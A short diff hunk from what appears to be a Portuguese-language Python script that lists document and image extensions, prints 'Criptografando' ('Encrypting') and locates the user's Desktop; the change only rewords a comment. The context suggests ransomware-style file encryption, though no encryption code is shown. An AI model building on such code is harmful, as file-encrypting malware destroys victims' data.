@@ -22,7 +22,7 @@ lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]
 print('Criptografando')
 time.sleep(3)
 
-# Entra no Desktop e faz a verificação
+# Entra no Desktop e verifica
 try:
     desktop = Path.home() / "Desktop"
 except Exception:
